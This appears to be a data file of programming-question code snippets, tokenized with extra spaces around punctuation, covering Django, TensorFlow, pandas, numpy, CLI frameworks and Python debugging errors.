"cmd subcmd -flag -stored=flag cd my/dir # define application controllersclass MyAppBaseController ( controller.CementBaseController ) : class Meta : label = 'base ' interface = controller.IController description = `` My Application Does Amazing Things '' arguments = [ ( [ ' -- base-opt ' ] , dict ( help= '' option under base controller '' ) ) , ] @ controller.expose ( help= '' base controller default command '' , hide=True ) def default ( self ) : self.app.args.parse_args ( [ ' -- help ' ] ) print `` Inside MyAppBaseController.default ( ) '' @ controller.expose ( help= '' another base controller command '' ) def command1 ( self ) : print `` Inside MyAppBaseController.command1 ( ) ''"
"import sysprint ( `` A '' ) print ( sys.argv ) import B import sysprint ( `` B '' ) print ( sys.argv ) > > python A.py -- foo bar > > A > > [ 'path/to/A.py ' , ' -- foo ' , 'bar ' ] > > B > > [ 'path/to/A.py ' , ' -- foo ' , 'bar ' ]"
"while True : with open ( 'file.txt ' , ' r ' ) as f : cfg = f.readlines ( ) time.sleep ( 60 )"
"for i in range ( 10 ) : # or range ( 4 , 10 , 2 ) etc foo ( i ) for ( auto i : range ( 10 ) ) //or range ( 4 , 10 , 2 ) or range ( 0.5 , 1.0 , 0.1 ) etc foo ( i ) ; std : :vector < int > v ( 10 ) ; std : :iota ( begin ( v ) , end ( v ) , 0 ) ; for ( auto i : v ) { foo ( i ) ; } for ( auto i : [ ] { vector < size_t > v ( 10 ) ; return iota ( begin ( v ) , end ( v ) , 0 ) , v ; } ( ) ) { foo ( i ) ; }"
"def setCellValue ( self , ( x , y ) , value ) : self.map [ x ] [ y ] = value def setCellValue ( self , ( x , y ) , value ) : ^SyntaxError : invalid syntax"
"def get_model_meta_class ( prm_name ) : class Meta : app_label = 'myapp ' setattr ( Meta , 'db_table ' , 'prm_ % s ' % prm_name ) return Metaprm_class_attrs = { 'foo ' : models.ForeignKey ( Foo ) , 'val ' : models.FloatField ( ) , 'err ' : models.FloatField ( blank=True , null=True ) , 'source ' : models.ForeignKey ( Source ) , '__module__ ' : __name__ , } # # # prm_a_attrs = prm_class_attrs.copy ( ) prm_a_attrs [ 'Meta ' ] = get_model_meta_class ( ' a ' ) Prm_a = type ( 'Prm_a ' , ( models.Model , ) , prm_a_attrs ) prm_b_attrs = prm_class_attrs.copy ( ) prm_b_attrs [ 'Meta ' ] = get_model_meta_class ( ' b ' ) Prm_b = type ( 'Prm_b ' , ( models.Model , ) , prm_b_attrs ) # # # # # # prms = [ ' a ' , ' b ' ] for prm_name in prms : prm_class_name = 'Prm_ % s ' % prm_name prm_class = type ( prm_class_name , ( models.Model , ) , prm_class_attrs ) setattr ( prm_class , 'Meta ' , get_model_meta_class ( prm_name ) ) globals ( ) [ prm_class_name ] = prm_class # # # File `` ... /models.py '' , line 168 , in < module > prm_class = type ( prm_class_name , ( models.Model , ) , prm_class_attrs ) File `` ... /lib/python2.7/site-packages/django/db/models/base.py '' , line 79 , in __new__ module = attrs.pop ( '__module__ ' ) KeyError : u'__module__ ' attrs = prm_class_attrs.copy ( ) attrs [ 'Meta ' ] = get_model_meta_class ( prm_name ) prm_class = type ( prm_class_name , ( models.Model , ) , attrs ) setattr ( prm_class , 'Meta ' , get_model_meta_class ( prm_name ) )"
"urlpatterns = patterns ( `` , url ( r'^ $ ' , views.index ) , url ( r'^double/ ( ? P < number > \d+ ) / $ ' , views.double ) , ) def double ( request , number=42 ) : return HttpResponse ( 2*number )"
"obj = { 'id ' : 'sometextid ' , 'time_created':05/12/2013 , # < -- -- datetime 'some other string property ' : 'some other value ' } raise cql.ProgrammingError ( `` Bad Request : % s '' % ire.why ) cql.apivalues.ProgrammingError : Bad Request : line 31:36 no viable alternative at character '\ ' cdatetimedatetimep4 ( S'\x07\xdd\x03\x1c\x000\x13\x05\xd0 < 'tRp5"
"[ [ ' a ' , ' b ' , ' c ' ] , [ 1,2,3 ] , [ ' i ' , ' j ' , ' k ' , ' l ' ] , [ 5,10,15,20 ] ] a , 1 , i , 5b , 2 , j , 10c , 3 , k , 15 , , l , 20"
"classifier = tf.estimator.Estimator ( model_fn=bag_of_words_model ) # Traintrain_input_fn = tf.estimator.inputs.numpy_input_fn ( x= { `` words '' : x_train } , # x_train is 2D numpy array of shape ( 26 , 5 ) y=y_train , # y_train is 1D panda series of length 26 batch_size=1000 , num_epochs=None , shuffle=True ) classifier.train ( input_fn=train_input_fn , steps=300 ) def serving_input_receiver_fn ( ) : serialized_tf_example = tf.placeholder ( dtype=tf.int64 , shape= ( None , 5 ) , name='words ' ) receiver_tensors = { `` predictor_inputs '' : serialized_tf_example } features = { `` words '' : tf.tile ( serialized_tf_example , multiples= [ 1 , 1 ] ) } return tf.estimator.export.ServingInputReceiver ( features , receiver_tensors ) full_model_dir = classifier.export_savedmodel ( export_dir_base= '' E : /models/ '' , serving_input_receiver_fn=serving_input_receiver_fn ) from tensorflow.contrib import predictorclassifier = predictor.from_saved_model ( `` E : \\models\\1547122667 '' ) predictions = classifier ( { 'predictor_inputs ' : x_test } ) print ( predictions ) { 'class ' : array ( [ 0 , 0 , 0 , 0 , 0 , 5 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 15 , 0 , 0 , 5 , 0 , 20 , 0 , 5 , 0 , 0 , 0 ] , dtype=int64 ) , 'prob ' : array ( [ [ 9.9397606e-01 , 6.5355714e-05 , 2.2225287e-05 , ... , 1.4510043e-07 , 1.6920333e-07 , 1.4865007e-07 ] , [ 9.9886864e-01 , 1.4976941e-06 , 7.0847680e-05 , ... , 9.4182191e-08 , 1.1828639e-07 , 9.5683227e-08 ] , [ 9.9884748e-01 , 2.1105163e-06 , 1.1994909e-05 , ... , 8.3957858e-08 , 1.0476184e-07 , 8.5592234e-08 ] , ... , [ 9.6145850e-01 , 6.9048328e-05 , 1.1446012e-04 , ... , 7.3761731e-07 , 8.8173107e-07 , 7.3824998e-07 ] , [ 9.7115618e-01 , 2.9716679e-05 , 5.9592247e-05 , ... , 2.8933655e-07 , 3.4183532e-07 , 2.9737942e-07 ] , [ 9.7387028e-01 , 6.9163914e-05 , 1.5800977e-04 , ... , 1.6116818e-06 , 1.9025001e-06 , 1.5990496e-06 ] ] , dtype=float32 ) } # Predict.test_input_fn = tf.estimator.inputs.numpy_input_fn ( x= { `` words '' : x_test } , y=y_test , num_epochs=1 , shuffle=False ) predictions = classifier.predict ( input_fn=test_input_fn ) print ( predictions ) { 'class ' : 0 , 'prob ' : array ( [ 9.9023646e-01 , 2.6038184e-05 , 3.9950578e-06 , ... , 1.3950405e-08 , 1.5713249e-08 , 1.3064114e-08 ] , dtype=float32 ) } { 'class ' : 1 , 'prob ' : array ( [ 2.0078469e-05 , 9.9907070e-01 , 8.9245419e-05 , ... , 6.6533559e-08 , 7.1365662e-08 , 6.8764685e-08 ] , dtype=float32 ) } { 'class ' : 2 , 'prob ' : array ( [ 3.0828053e-06 , 9.6484597e-05 , 9.9906868e-01 , ... , 5.9190391e-08 , 6.0995028e-08 , 6.2322023e-08 ] , dtype=float32 ) } { 'class ' : 3 , 'prob ' : array ( [ 7.4923842e-06 , 1.1112734e-06 , 1.1697492e-06 , ... , 4.4295877e-08 , 4.4563325e-08 , 4.0475427e-08 ] , dtype=float32 ) } { 'class ' : 4 , 'prob ' : array ( [ 4.6085161e-03 , 2.8403942e-05 , 2.0638861e-05 , ... , 7.6083229e-09 , 8.5255349e-09 , 6.7836012e-09 ] , dtype=float32 ) } { 'class ' : 5 , 'prob ' : array ( [ 6.2119620e-06 , 7.2357750e-07 , 2.6231232e-06 , ... , 7.4999367e-09 , 9.0847436e-09 , 7.5630142e-09 ] , dtype=float32 ) } { 'class ' : 6 , 'prob ' : array ( [ 4.4882968e-06 , 2.2007227e-06 , 8.3352124e-06 , ... , 2.3130213e-09 , 2.3657243e-09 , 2.0045692e-09 ] , dtype=float32 ) } { 'class ' : 7 , 'prob ' : array ( [ 1.88617545e-04 , 9.01482690e-06 , 1.47353385e-05 , ... , 3.38567552e-09 , 3.97709154e-09 , 3.37017392e-09 ] , dtype=float32 ) } { 'class ' : 8 , 'prob ' : array ( [ 1.9843496e-06 , 4.5909755e-06 , 4.8804057e-05 , ... , 2.2636470e-08 , 2.0094852e-08 , 2.0215294e-08 ] , dtype=float32 ) } { 'class ' : 9 , 'prob ' : array ( [ 2.5907659e-04 , 4.4661370e-05 , 6.9490757e-06 , ... , 1.6249915e-08 , 1.7579131e-08 , 1.5439820e-08 ] , dtype=float32 ) } { 'class ' : 10 , 'prob ' : array ( [ 3.6456138e-05 , 7.5861579e-05 , 3.0208937e-05 , ... , 2.7859956e-08 , 2.5423596e-08 , 2.8662368e-08 ] , dtype=float32 ) } { 'class ' : 11 , 'prob ' : array ( [ 1.1723863e-05 , 9.1407037e-06 , 4.8835855e-04 , ... , 2.3693143e-08 , 2.0524153e-08 , 2.3223269e-08 ] , dtype=float32 ) } { 'class ' : 12 , 'prob ' : array ( [ 1.2886175e-06 , 2.6652628e-05 , 2.7812246e-06 , ... , 4.8295210e-08 , 4.4282604e-08 , 4.7342766e-08 ] , dtype=float32 ) } { 'class ' : 13 , 'prob ' : array ( [ 3.3486103e-05 , 1.3361238e-05 , 3.6493871e-05 , ... , 2.2195401e-09 , 2.4768412e-09 , 2.0150714e-09 ] , dtype=float32 ) } { 'class ' : 14 , 'prob ' : array ( [ 4.6108948e-05 , 3.0377207e-05 , 2.0945006e-06 , ... , 4.2276231e-08 , 5.2376720e-08 , 4.4969173e-08 ] , dtype=float32 ) } { 'class ' : 15 , 'prob ' : array ( [ 1.7165689e-04 , 2.9350400e-05 , 3.2283624e-05 , ... , 7.1849078e-09 , 7.6871531e-09 , 6.6224697e-09 ] , dtype=float32 ) } { 'class ' : 16 , 'prob ' : array ( [ 5.9876328e-07 , 3.0931276e-06 , 1.5760432e-05 , ... , 4.0450086e-08 , 4.2720632e-08 , 4.6017195e-08 ] , dtype=float32 ) } { 'class ' : 17 , 'prob ' : array ( [ 2.6658317e-04 , 9.9656281e-05 , 4.0355867e-06 , ... , 1.2873563e-08 , 1.4808875e-08 , 1.2155732e-08 ] , dtype=float32 ) } { 'class ' : 18 , 'prob ' : array ( [ 1.4914459e-04 , 2.1025437e-06 , 1.2505146e-05 , ... , 9.8899635e-09 , 1.1115599e-08 , 8.9312255e-09 ] , dtype=float32 ) } { 'class ' : 19 , 'prob ' : array ( [ 2.5615416e-04 , 2.3750392e-05 , 2.2886352e-04 , ... , 3.9635733e-08 , 4.5139984e-08 , 3.8605780e-08 ] , dtype=float32 ) } { 'class ' : 20 , 'prob ' : array ( [ 6.3949975e-04 , 2.3652929e-05 , 7.8577641e-06 , ... , 2.0959168e-09 , 2.5495863e-09 , 2.0428985e-09 ] , dtype=float32 ) } { 'class ' : 21 , 'prob ' : array ( [ 8.2179489e-05 , 8.4409467e-06 , 5.4756888e-06 , ... , 2.2360982e-09 , 2.4820561e-09 , 2.1206517e-09 ] , dtype=float32 ) } { 'class ' : 22 , 'prob ' : array ( [ 3.9681905e-05 , 2.4394642e-06 , 8.9102805e-06 , ... , 2.0282410e-08 , 2.1132811e-08 , 1.8368105e-08 ] , dtype=float32 ) } { 'class ' : 23 , 'prob ' : array ( [ 3.0794261e-05 , 6.5104805e-06 , 3.3528936e-06 , ... , 2.0360846e-09 , 1.9360573e-09 , 1.7195430e-09 ] , dtype=float32 ) } { 'class ' : 24 , 'prob ' : array ( [ 3.4596618e-05 , 2.2907707e-06 , 2.5318438e-06 , ... , 1.1038886e-08 , 1.2148775e-08 , 9.9556408e-09 ] , dtype=float32 ) } { 'class ' : 25 , 'prob ' : array ( [ 1.4846727e-03 , 1.9189476e-06 , 5.3232620e-06 , ... , 3.1966723e-09 , 3.5612517e-09 , 3.0947123e-09 ] , dtype=float32 ) } classifier = tf.estimator.Estimator ( model_fn=bag_of_words_model , model_dir= '' E : /models/ '' ) # Added model_dir argsclassifier = tf.estimator.Estimator ( model_fn=bag_of_words_model , model_dir= '' E : /models/ '' ) # Predict.test_input_fn = tf.estimator.inputs.numpy_input_fn ( x= { WORDS_FEATURE : x_test } , y=y_test , num_epochs=1 , shuffle=False ) predictions = classifier.predict ( input_fn=test_input_fn ) INFO : tensorflow : Using default config.INFO : tensorflow : Using config : { '_model_dir ' : ' E : /models/ ' , '_tf_random_seed ' : None , '_save_summary_steps ' : 100 , '_save_checkpoints_steps ' : None , '_save_checkpoints_secs ' : 600 , '_session_config ' : allow_soft_placement : truegraph_options { rewrite_options { meta_optimizer_iterations : ONE } } , '_keep_checkpoint_max ' : 5 , '_keep_checkpoint_every_n_hours ' : 10000 , '_log_step_count_steps ' : 100 , '_train_distribute ' : None , '_device_fn ' : None , '_protocol ' : None , '_eval_distribute ' : None , '_experimental_distribute ' : None , '_service ' : None , '_cluster_spec ' : < tensorflow.python.training.server_lib.ClusterSpec object at 0x0000028240FAB518 > , '_task_type ' : 'worker ' , '_task_id ' : 0 , '_global_id_in_cluster ' : 0 , '_master ' : `` , '_evaluation_master ' : `` , '_is_chief ' : True , '_num_ps_replicas ' : 0 , '_num_worker_replicas ' : 1 } WARNING : tensorflow : From E : \ml_classif\venv\lib\site-packages\tensorflow\python\estimator\inputs\queues\feeding_queue_runner.py:62 : QueueRunner.__init__ ( from tensorflow.python.training.queue_runner_impl ) is deprecated and will be removed in a future version.Instructions for updating : To construct input pipelines , use the ` tf.data ` module.WARNING : tensorflow : From E : \ml_classif\venv\lib\site-packages\tensorflow\python\estimator\inputs\queues\feeding_functions.py:500 : add_queue_runner ( from tensorflow.python.training.queue_runner_impl ) is deprecated and will be removed in a future version.Instructions for updating : To construct input pipelines , use the ` tf.data ` module.INFO : tensorflow : Calling model_fn.INFO : tensorflow : Done calling model_fn.INFO : tensorflow : Graph was finalized.2019-01-14 19:17:51.157091 : I tensorflow/core/platform/cpu_feature_guard.cc:141 ] Your CPU supports instructions that this TensorFlow binary was not compiled to use : AVX2INFO : tensorflow : Restoring parameters from E : /models/model.ckpt-100INFO : tensorflow : Running local_init_op.INFO : tensorflow : Done running local_init_op.WARNING : tensorflow : From E : \ml_classif\venv\lib\site-packages\tensorflow\python\training\monitored_session.py:804 : start_queue_runners ( from tensorflow.python.training.queue_runner_impl ) is deprecated and will be removed in a future version . { 'class ' : 0 , 'prob ' : array ( [ 9.8720157e-01 , 1.9098983e-04 , 8.6194178e-04 , ... , 9.8885458e-08 , 1.0560690e-07 , 1.1116919e-07 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.9646854e-01 , 7.3993037e-06 , 1.6678940e-03 , ... , 3.3662158e-08 , 3.7401023e-08 , 3.9902886e-08 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.9418157e-01 , 2.2869966e-05 , 7.2757481e-04 , ... , 7.2877960e-08 , 8.5308180e-08 , 8.7949694e-08 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.8990846e-01 , 2.0035572e-05 , 5.0557905e-04 , ... , 4.2098847e-08 , 4.6305473e-08 , 4.8882491e-08 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.3541616e-01 , 1.6300696e-03 , 2.8230180e-03 , ... , 3.4934112e-07 , 3.5947951e-07 , 3.8610020e-07 ] , dtype=float32 ) } { 'class ' : 5 , 'prob ' : array ( [ 4.5955207e-04 , 3.9533910e-04 , 2.9366053e-04 , ... , 6.4991447e-08 , 6.5079021e-08 , 6.8886770e-08 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.2468429e-01 , 4.9159536e-04 , 9.2872838e-03 , ... , 1.0636869e-06 , 1.1284576e-06 , 1.1437518e-06 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.5501184e-01 , 2.6409564e-04 , 3.8474586e-03 , ... , 1.4077391e-06 , 1.4964197e-06 , 1.4892942e-06 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.4813752e-01 , 2.7400412e-04 , 2.2020808e-03 , ... , 2.9592795e-06 , 3.0286824e-06 , 3.0610188e-06 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.6341538e-01 , 3.4047980e-04 , 2.0810752e-03 , ... , 6.5900326e-07 , 6.7539651e-07 , 7.0834898e-07 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.9541759e-01 , 7.4490390e-06 , 3.9836011e-04 , ... , 5.1197322e-08 , 5.6648332e-08 , 5.9212919e-08 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.9666804e-01 , 1.2600798e-05 , 3.1346193e-04 , ... , 3.9119975e-08 , 4.3912351e-08 , 4.7076494e-08 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.9582565e-01 , 2.3773579e-05 , 5.5219355e-04 , ... , 8.2924736e-08 , 9.1671566e-08 , 9.3954029e-08 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.4328243e-01 , 1.5643415e-04 , 3.1944674e-03 , ... , 3.9115656e-07 , 4.2140312e-07 , 4.4074648e-07 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.9599898e-01 , 1.3793178e-05 , 6.0236652e-04 , ... , 1.1893864e-07 , 1.3845128e-07 , 1.4301372e-07 ] , dtype=float32 ) } { 'class ' : 15 , 'prob ' : array ( [ 1.8115035e-03 , 1.0454544e-03 , 2.0831774e-03 , ... , 4.5647434e-06 , 5.0818121e-06 , 4.9641203e-06 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.9594927e-01 , 9.6870117e-06 , 3.7690319e-04 , ... , 1.1332005e-07 , 1.2312253e-07 , 1.3208249e-07 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.4268161e-01 , 7.6396938e-04 , 3.4147443e-03 , ... , 5.8237259e-07 , 5.8584078e-07 , 5.9859877e-07 ] , dtype=float32 ) } { 'class ' : 18 , 'prob ' : array ( [ 1.2369211e-03 , 7.1954611e-03 , 3.4218519e-03 , ... , 1.6767866e-06 , 1.5141470e-06 , 1.5795833e-06 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.9327940e-01 , 2.4744159e-05 , 8.3286857e-04 , ... , 8.1387967e-08 , 9.2638246e-08 , 9.4754824e-08 ] , dtype=float32 ) } { 'class ' : 18 , 'prob ' : array ( [ 4.3461438e-02 , 7.7443835e-03 , 1.0502382e-02 , ... , 6.1044288e-06 , 6.4804617e-06 , 6.6003668e-06 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.1440409e-01 , 2.1251327e-04 , 1.9904026e-03 , ... , 9.9065488e-08 , 1.0103827e-07 , 1.0984956e-07 ] , dtype=float32 ) } { 'class ' : 5 , 'prob ' : array ( [ 4.2783137e-02 , 1.3115143e-02 , 1.6208552e-02 , ... , 3.9897031e-06 , 3.9228212e-06 , 4.1420644e-06 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.0668356e-01 , 6.9979503e-04 , 4.9138898e-03 , ... , 4.2717656e-07 , 4.3982755e-07 , 4.7387920e-07 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.3811822e-01 , 1.6991694e-04 , 2.0085643e-03 , ... , 3.8740203e-07 , 4.0521365e-07 , 4.3191656e-07 ] , dtype=float32 ) } { 'class ' : 0 , 'prob ' : array ( [ 9.5434970e-01 , 2.1576983e-04 , 2.3911290e-03 , ... , 7.2219399e-07 , 7.4783770e-07 , 7.9287622e-07 ] , dtype=float32 ) }"
"uname -a Linux -esktop 3.13.0-30-generic # 55-Ubuntu SMP Fri Jul 4 21:40:53 UTC 2014 x86_64 x86_64 x86_64 GNU/Linuxlsb_release -aLSB Version : core-2.0-amd64 : core-2.0-noarch : core-3.0-amd64 : core-3.0-noarch : core-3.1-amd64 : core-3.1-noarch : core-3.2-amd64 : core-3.2-noarch : core-4.0-amd64 : core-4.0-noarch : core-4.1-amd64 : core-4.1-noarch : security-4.0-amd64 : security-4.0-noarch : security-4.1-amd64 : security-4.1-noarchDistributor ID : UbuntuDescription : Ubuntu 14.04.1 LTSRelease : 14.04Codename : trusty Cleaning up ... Command /usr/bin/python -c `` import setuptools , tokenize ; __file__='/tmp/pip_build_root/llvmpy/setup.py ' ; exec ( compile ( getattr ( tokenize , 'open ' , open ) ( __file__ ) .read ( ) .replace ( '\r\n ' , '\n ' ) , __file__ , 'exec ' ) ) '' install -- record /tmp/pip-7HvRcB-record/install-record.txt -- single-version-externally-managed -- compile failed with error code 1 in /tmp/pip_build_root/llvmpyTraceback ( most recent call last ) : File `` /usr/bin/pip '' , line 9 , in < module > load_entry_point ( 'pip==1.5.4 ' , 'console_scripts ' , 'pip ' ) ( ) File `` /usr/lib/python2.7/dist-packages/pip/__init__.py '' , line 185 , in main return command.main ( cmd_args ) File `` /usr/lib/python2.7/dist-packages/pip/basecommand.py '' , line 161 , in main text = '\n'.join ( complete_log ) UnicodeDecodeError : 'ascii ' codec ca n't decode byte 0xe2 in position 42 : ordinal not in range ( 128 )"
"def get_token ( backend , user , response , *args , **kwargs ) : # get token from the oauth2 flow social = user.social_auth.get ( provider='google-oauth2 ' ) access_token = social.extra_data [ 'access_token ' ] refresh_token = social.extra_data.get ( 'refresh_token ' ) # set django sessionSESSION_EXPIRE_AT_BROWSER_CLOSE = True # psa settingsSOCIAL_AUTH_URL_NAMESPACE = 'social ' # see http : //psa.matiasaguirre.net/docs/configuration/settings.htmlSOCIAL_AUTH_UUID_LENGTH = 32AUTHENTICATION_BACKENDS = ( # 'social.backends.facebook.FacebookOAuth2 ' , 'social.backends.google.GoogleOAuth2 ' , # 'social.backends.twitter.TwitterOAuth ' , 'django.contrib.auth.backends.ModelBackend ' , ) SOCIAL_AUTH_PIPELINE = ( 'social.pipeline.social_auth.social_details ' , 'social.pipeline.social_auth.social_uid ' , 'social.pipeline.social_auth.auth_allowed ' , 'social.pipeline.social_auth.social_user ' , 'social.pipeline.user.get_username ' , 'social.pipeline.user.create_user ' , 'social.pipeline.social_auth.associate_user ' , 'social.pipeline.social_auth.load_extra_data ' , 'social.pipeline.user.user_details ' , 'youtube.pipeline.get_token ' , )"
"{ `` image_data '' : [ { `` non_field_errors '' : [ `` Invalid data '' ] } ] class Photo ( models.Model ) : user = models.ForeignKey ( AppUser , help_text= '' Item belongs to . '' ) image_data = models.ForeignKey ( `` PhotoData '' , null=True , blank=True ) class PhotoData ( models.Model ) : thisdata = JSONField ( ) class ExternalJSONField ( serializers.WritableField ) : def to_native ( self , obj ) : return json.dumps ( obj ) def from_native ( self , value ) : try : val = json.loads ( value ) except TypeError : raise serializers.ValidationError ( `` Could not load json < { } > '' .format ( value ) ) return valclass PhotoDataSerializer ( serializers.ModelSerializer ) : thisdata = ExternalJSONField ( ) class Meta : model = PhotoData fields = ( `` id '' , `` thisdata '' ) class PhotoSerializer ( serializers.ModelSerializer ) : image_data = PhotoDataSerializer ( ) class Meta : model = Photo fields = ( `` id '' , '' user '' , `` image_data '' ) > payload = { `` image_data '' : { `` thisdata '' : `` { } '' } } > requests.patch ( `` /photo/123/ '' , payload ) > payload = { `` image_data '' : [ { `` thisdata '' : `` { } '' } ] } > requests.patch ( `` /photo/123/ '' , payload )"
import logginglogger = logging.getLogger ( 'simple_example ' ) logger.setLevel ( logging.DEBUG ) handler = logging.StreamHandler ( ) logger.addHandler ( handler ) logger.debug ( 'debug log ' ) logger.info ( 'info log ' ) logger.warning ( 'warning log ' ) logger.error ( 'error log ' ) python log_example.py > file.log
"def _odd_iter ( ) : n=3 while True : yield n n=n+2def _not_divisible ( n ) : return lambda x : x % n > 0def primes ( ) : yield 2 L=_odd_iter ( ) while True : n=next ( L ) yield n L=filter ( _not_divisible ( n ) , L ) x=1for t in primes ( ) : print ( t ) x=x+1 if x==10 : break def primes ( ) : yield 2 L=_odd_iter ( ) while True : n=next ( L ) yield n L=filter ( lambda x : x % n > 0 , L )"
IP_address IP1 IP1 IP1 IP4 IP4 IP4 IP4 IP4 IP7 IP7 IP7 IP_address IP_address_Count IP1 3 IP1 3 IP1 3 IP4 5 IP4 5 IP4 5 IP4 5 IP4 5 IP7 3 IP7 3 IP7 3 unique_ip_address_count = ( df_c_train.drop_duplicates ( ) .IP_address.value_counts ( ) ) .to_dict ( )
"class Item ( models.Model ) : signature = models.CharField ( 'Signatur ' , max_length=50 ) class AlphanumericSignatureFilter ( admin.SimpleListFilter ) : title = 'Signature ( alphanumeric ) ' parameter_name = 'signature_alphanumeric ' def lookups ( self , request , model_admin ) : return ( ( 'signature ' , 'Signature ( alphanumeric ) ' ) , ) def queryset ( self , request , queryset : QuerySet ) : return queryset.order_by ( 'signature ' )"
"`` flask '' : { `` hashes '' : [ `` sha256:2271c0070dbcb5275fad4a82e29f23ab92682dc45f9dfbc22c02ba9b9322ce48 '' , `` sha256 : a080b744b7e345ccfcbc77954861cb05b3c63786e93f2b3875e0913d44b43f05 '' ] , `` index '' : `` pypi '' , `` version '' : `` ==1.0.2 '' } ,"
< ItemGroup > < Interpreter Include= '' VirtualEnvironment\ '' > < Id > VirtualEnvironment < /Id > < Version > 3.6 < /Version > < Description > VirtualEnvironment ( Python 3.6 ( 64-bit ) ) < /Description > < InterpreterPath > Scripts\python.exe < /InterpreterPath > < WindowsInterpreterPath > Scripts\pythonw.exe < /WindowsInterpreterPath > < PathEnvironmentVariable > PYTHONPATH < /PathEnvironmentVariable > < Architecture > X64 < /Architecture > < /Interpreter >
dt dist0 20160811 11:10 1.01 20160811 11:15 1.42 20160811 12:15 1.83 20160811 12:32 0.64 20160811 12:34 0.85 20160811 14:38 0.2 dt dist0 20160811 11:10 1.01 20160811 11:15 1.42 20160811 12:15 1.8 dt dist0 20160811 12:32 0.61 20160811 12:34 0.8 dt dist0 20160811 14:38 0.2
"from ctypes import c_uint , create_string_buffer , CFUNCTYPE , addressofCPUID = create_string_buffer ( `` \x53\x31\xc0\x40\x0f\xa2\x5b\xc3 '' ) cpuinfo = CFUNCTYPE ( c_uint ) ( addressof ( CPUID ) ) print cpuinfo ( )"
"import pandas as pdareas = pd.DataFrame ( { 'Com ' : [ 1,2,3 ] , 'Ind ' : [ 4,5,6 ] } ) demand = pd.DataFrame ( { 'Water ' : [ 4,3 ] , 'Elec ' : [ 8,9 ] } , index= [ 'Com ' , 'Ind ' ] ) areas Com Ind0 1 41 2 52 3 6demand Elec WaterCom 8 4Ind 9 3 area_demands Com Ind Elec Water Elec Water 0 8 4 36 12 1 16 8 45 15 2 24 12 54 18 areas = pd.DataFrame ( { 'area ' : areas.stack ( ) } ) areas.index.names = [ 'Edge ' , 'Type ' ] both = areas.reset_index ( 1 ) .join ( demand , on='Type ' ) both [ 'Elec ' ] = both [ 'Elec ' ] * both [ 'area ' ] both [ 'Water ' ] = both [ 'Water ' ] * both [ 'area ' ] del both [ 'area ' ] # almost there ; it must be late , I fail to make 'Type ' a hierarchical column ... Type Elec WaterEdge0 Com 8 40 Ind 36 121 Com 16 81 Ind 45 152 Com 24 122 Ind 54 18"
"a = list ( [ 0 , 0 , 1 , 1 , 2 , 2 , 3 , 3 , 4 , 4 ] ) for i in range ( 10 ) : a.append ( int ( i / 2 ) )"
"import numpy as npnp.save ( 'test.npy ' , [ np.zeros ( ( 2 , 2 ) ) , np.zeros ( ( 3,3 ) ) ] ) np.save ( 'test.npy ' , [ np.zeros ( ( 2 , 2 ) ) , np.zeros ( ( 2,3 ) ) ] ) ValueError : could not broadcast input array from shape ( 2,2 ) into shape ( 2 ) x=np.array ( [ np.zeros ( ( 2 , 2 ) ) , np.zeros ( ( 3,3 ) ) ] ) y=np.array ( [ np.zeros ( ( 2 , 2 ) ) , np.zeros ( ( 2,3 ) ) ] ) > > > x.shape ( 2 , ) > > > x.dtypedtype ( ' O ' ) > > > x [ 0 ] .shape ( 2 , 2 ) > > > x [ 0 ] .dtypedtype ( 'float64 ' ) np.array ( [ np.zeros ( ( 2 , 2 ) ) , np.zeros ( ( 2,3 ) ) ] , dtype=object ) array_list=np.array ( [ np.zeros ( ( 2 , 2 ) ) , np.zeros ( ( 2,3 ) ) ] ) save_array = np.empty ( ( len ( array_list ) , ) , dtype=object ) for idx , arr in enumerate ( array_list ) : save_array [ idx ] = arrnp.save ( 'test.npy ' , save_array )"
"subprocess.Popen ( 'candump -tA can0 can1 > > % s ' % ( file_name ) , shell=True ) candump -tA can0 can1 > > file_name"
"COMPRESS_ENABLED = TrueSTATICFILES_STORAGE = ' [ my app 's name ] .storage.CachedS3BotoStorage ' ( a subclass of S3BotoStorage that is almost identical to the one from django-compressor 's docs linked above ) COMPRESS_STORAGE = STATICFILES_STORAGECOMPRESS_URL = STATIC_URLCACHES = { 'default ' : { 'BACKEND ' : 'django_pylibmc.memcached.PyLibMCCache ' , 'LOCATION ' : 'localhost:11211 ' , 'TIMEOUT ' : 500 , 'BINARY ' : True , } } < Error > < Code > AccessDenied < /Code > < Message > Request has expired < /Message > < RequestId > 81A63F24378ECB5E < /RequestId > < Expires > 2012-09-18T18:39:02Z < /Expires > < HostId > lIr5l9Fna95DUfk6hUsWqhO5EQNn6Ayu8BatpEavis8YzLvsaJRru4O8P/50pgMy < /HostId > < ServerTime > 2012-09-18T18:59:51Z < /ServerTime > < /Error >"
"import numpy as npimport pandas as pdimport dask.DataFrame as ddwith pd.HDFStore ( path ) as store : data = dd.from_hdf ( store , 'sim ' ) [ col1 ] shifted = data.shift ( 1 ) idx = data.apply ( np.sign ) ! = shifted.apply ( np.sign )"
"myfruits = { 'apple ' : ( 'fleshy ' , 'red ' , 'medium ' ) , 'orange ' : ( 'fleshy ' , 'orange ' , 'medium ' ) , 'peanut ' : ( 'dry ' , 'red ' , 'small ' ) , ... }"
